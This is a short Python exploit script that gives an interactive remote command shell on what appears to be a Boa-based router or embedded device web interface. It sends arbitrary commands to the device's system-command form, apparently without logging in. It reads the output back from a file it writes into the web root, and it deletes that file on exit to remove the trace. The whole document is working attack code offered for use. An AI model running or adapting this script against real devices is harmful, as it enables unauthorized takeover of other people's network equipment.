import requests
import argparse, sys

def RUNCMD(url, cmd):
	if cmd == 'exitShell':
		cmd = 'rm /var/web/t.js;'
	else:
		cmd += ' > /var/web/t.js 2>&1;'
	data = {
		"submit-url": "/syscmd.htm",
		"sysCmdselect": 5,
		"sysCmdselects": 0,
		"save_apply": "Run Command",
		"sysCmd": "%s" % cmd
	}

	r = requests.post("%s/Login/boafrm/formSysCmd" % url, data=data, allow_redirects=False)
	if "syscmd.htm" not in r.content:
		print("Device isn't vulnerable")
		sys.exit()

	r = requests.get("%s/t.js" % url, allow_redirects=False)
	return r.content

def main():
	print ("Author: ...")
	parser = argparse.ArgumentParser()
	parser.add_argument('--url', '-u', help='target url')
	args = parser.parse_args()
	if args.url == None:
		parser.print_help()
		sys.exit()
	url = args.url
	if url[-1] == "/":
		url = url[:-1]
	if "http://" not in url and "https://" not in url:
		url = "http://{0}".format(url)
	
	while True:
		cmd = raw_input("$ ")
		if cmd == 'exit' or cmd == 'quit':
			RUNCMD(url, 'exitShell')
			break
		print(RUNCMD(url, cmd))

if __name__=='__main__':
	main()